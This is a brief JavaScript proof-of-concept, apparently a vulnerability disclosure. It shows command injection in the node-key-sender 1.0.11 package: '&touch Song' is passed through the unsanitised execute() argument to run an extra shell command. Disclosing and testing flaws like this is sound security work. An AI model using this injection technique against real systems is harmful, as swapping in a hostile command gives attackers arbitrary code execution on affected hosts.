/**
 * node-key-sender@1.0.11 is vulnerable to command injection.
 * the injection point is located in line 117 of file "key-sender.js" 
 * in function execute().
 * the argument "arrParams" in function execute() can be controlled by 
 * users without any sanitization.
 */


var root = require("node-key-sender");
var attack_code = ["&touch", "Song"];
root.execute(attack_code);
